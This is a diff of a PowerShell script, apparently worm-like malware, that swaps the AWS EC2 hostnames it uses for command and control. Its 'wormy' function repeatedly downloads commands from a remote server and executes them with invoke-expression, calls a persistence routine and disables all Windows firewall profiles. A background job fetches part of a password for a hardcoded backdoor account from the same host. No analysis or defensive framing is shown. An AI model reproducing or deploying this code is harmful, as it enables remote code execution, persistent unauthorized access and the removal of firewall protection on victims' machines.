@@ -74,7 +74,7 @@ function keepWINRMAlive{
 function wormy{
     
     while(1 -eq 1){
-    $httpCommand=invoke-restmethod http://ec2-3-236-235-15.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt
+    $httpCommand=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt
     invoke-expression $httpCommand
     accountPersist
     Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
@@ -114,7 +114,7 @@ function wormy{
 
 start-job -ScriptBlock{
     
-    $toAppend=invoke-restmethod http://ec2-18-205-66-203.compute-1.amazonaws.com/eeee/timeZ.txt
+    $toAppend=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/eeee/timeZ.txt
     $username='magrene'
     $c0de='Tossking@'
     $c0de=$c0de+$toAppend
